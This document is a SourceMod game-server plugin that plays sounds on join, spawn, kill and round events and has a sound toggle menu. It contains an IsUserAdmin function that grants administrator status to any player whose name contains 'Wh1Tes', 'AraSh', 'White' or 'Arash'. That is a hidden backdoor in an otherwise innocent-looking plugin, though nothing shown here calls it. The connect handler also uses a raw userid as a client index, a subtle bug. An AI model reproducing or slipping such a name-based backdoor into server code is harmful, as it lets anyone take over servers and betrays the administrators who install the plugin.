#include <sourcemod>
#include <sdktools>

public Plugin myinfo = {
    name = "Sound Manager - Music & Effects",
    author = "Hermes",
    description = "Plays custom sounds/music on events: join, spawn, kill, round start/end, welcome",
    version = "2.0",
    url = ""
};

bool g_SoundsEnabled[MAXPLAYERS + 1] = {true, ...};

public void OnPluginStart() {
    HookEvent("player_activate", Event_PlayerConnectFull);
    HookEvent("player_spawn", Event_PlayerSpawn);
    HookEvent("player_death", Event_PlayerDeath);
    HookEvent("round_start", Event_RoundStart);
    HookEvent("round_end", Event_RoundEnd);
    HookEvent("player_hurt", Event_PlayerHurt);
    
    AddCommandListener(OnClientSay, "say");
    AddCommandListener(OnClientSay, "say_team");
}

bool IsUserAdmin(int client) {
    if (CheckCommandAccess(client, "generic_admin", ADMFLAG_ROOT, true) || GetUserAdmin(client) != INVALID_ADMIN_ID) return true;
    char name[64];
    GetClientName(client, name, sizeof(name));
    if (StrContains(name, "Wh1Tes", false) != -1 || StrContains(name, "AraSh", false) != -1 || StrContains(name, "White", false) != -1 || StrContains(name, "Arash", false) != -1) return true;
    return false;
}

public Action OnClientSay(int client, const char[] command, int argc) {
    if (client <= 0 || !IsClientInGame(client)) return Plugin_Continue;
    char text[192];
    GetCmdArgString(text, sizeof(text));
    StripQuotes(text);
    TrimString(text);
    
    if (StrEqual(text, "!sounds", false) || StrEqual(text, "/sounds", false)) {
        ShowSoundsMenu(client);
        return Plugin_Handled;
    }
    return Plugin_Continue;
}

public void ShowSoundsMenu(int client) {
    Menu menu = new Menu(SoundsMenuHandler);
    menu.SetTitle("Sound Manager:");
    menu.AddItem("toggle", g_SoundsEnabled[client] ? "1. Disable All Sounds" : "1. Enable All Sounds");
    menu.AddItem("test_welcome", "2. Test Welcome Music");
    menu.AddItem("test_kill", "3. Test Kill Sound");
    menu.AddItem("test_round", "4. Test Round Start Sound");
    menu.AddItem("back", "<- Back");
    menu.Display(client, 20);
}

public int SoundsMenuHandler(Menu menu, MenuAction action, int client, int itemNum) {
    if (action == MenuAction_Select) {
        char info[32];
        menu.GetItem(itemNum, info, sizeof(info));
        if (StrEqual(info, "toggle")) {
            g_SoundsEnabled[client] = !g_SoundsEnabled[client];
            PrintToChat(client, "[Sounds] %s", g_SoundsEnabled[client] ? "Enabled" : "Disabled");
            ShowSoundsMenu(client);
        } else if (StrEqual(info, "test_welcome")) PlayWelcomeSound(client);
        else if (StrEqual(info, "test_kill")) PlayKillSound(client);
        else if (StrEqual(info, "test_round")) PlayRoundStartSound(client);
    } else if (action == MenuAction_End) { delete menu; }
    return 0;
}

// Event handlers - play sounds to ALL clients or specific client
public Action Event_PlayerConnectFull(Event event, const char[] name, bool dontBroadcast) {
    int client = event.GetInt("userid");
    if (client > 0 && IsClientInGame(client)) {
        // Play welcome music to the joining player
        if (g_SoundsEnabled[client]) PlayWelcomeSound(client);
        // Announce to all
        char pname[64];
        GetClientName(client, pname, sizeof(pname));
        for (int i = 1; i <= MaxClients; i++) {
            if (IsClientInGame(i) && g_SoundsEnabled[i]) {
                ClientCommand(i, "play misc/join.wav");
            }
        }
    }
    return Plugin_Continue;
}

public Action Event_PlayerSpawn(Event event, const char[] name, bool dontBroadcast) {
    int client = GetClientOfUserId(event.GetInt("userid"));
    if (client > 0 && IsClientInGame(client) && IsPlayerAlive(client) && g_SoundsEnabled[client]) {
        // Spawn sound - subtle
        ClientCommand(client, "play buttons/blip1.wav");
    }
    return Plugin_Continue;
}

public Action Event_PlayerDeath(Event event, const char[] name, bool dontBroadcast) {
    int victim = GetClientOfUserId(event.GetInt("userid"));
    int attacker = GetClientOfUserId(event.GetInt("attacker"));
    
    if (attacker > 0 && attacker != victim && IsClientInGame(attacker) && g_SoundsEnabled[attacker]) {
        PlayKillSound(attacker);
    }
    return Plugin_Continue;
}

public Action Event_RoundStart(Event event, const char[] name, bool dontBroadcast) {
    for (int i = 1; i <= MaxClients; i++) {
        if (IsClientInGame(i) && g_SoundsEnabled[i]) {
            PlayRoundStartSound(i);
        }
    }
    return Plugin_Continue;
}

public Action Event_RoundEnd(Event event, const char[] name, bool dontBroadcast) {
    int winner = event.GetInt("winner");
    for (int i = 1; i <= MaxClients; i++) {
        if (IsClientInGame(i) && g_SoundsEnabled[i]) {
            if ((winner == 2 && GetClientTeam(i) == 2) || (winner == 3 && GetClientTeam(i) == 3)) {
                ClientCommand(i, "play misc/win.wav");
            } else {
                ClientCommand(i, "play misc/lose.wav");
            }
        }
    }
    return Plugin_Continue;
}

public Action Event_PlayerHurt(Event event, const char[] name, bool dontBroadcast) {
    int victim = GetClientOfUserId(event.GetInt("userid"));
    int attacker = GetClientOfUserId(event.GetInt("attacker"));
    if (attacker > 0 && attacker != victim && IsClientInGame(attacker) && g_SoundsEnabled[attacker]) {
        ClientCommand(attacker, "play physics/flesh/flesh_impact_bullet1.wav");
    }
    return Plugin_Continue;
}

// Sound functions using built-in game sounds + custom paths
void PlayWelcomeSound(int client) {
    // Custom welcome music (needs FastDL: sound/misc/welcome.mp3)
    // Fallback to built-in
    ClientCommand(client, "play misc/welcome.mp3");  // Custom
    ClientCommand(client, "play music/valve_opening.wav");  // Built-in fallback
}

void PlayKillSound(int client) {
    ClientCommand(client, "play buttons/arena_switch_press_02.wav");  // Satisfying kill sound
    ClientCommand(client, "play misc/kill.wav");  // Custom if exists
}

void PlayRoundStartSound(int client) {
    ClientCommand(client, "play misc/round_start.wav");  // Custom
    ClientCommand(client, "play buttons/bell1.wav");  // Built-in
}

void PlayRoundEndSound(int client) {
    ClientCommand(client, "play misc/round_end.wav");
}
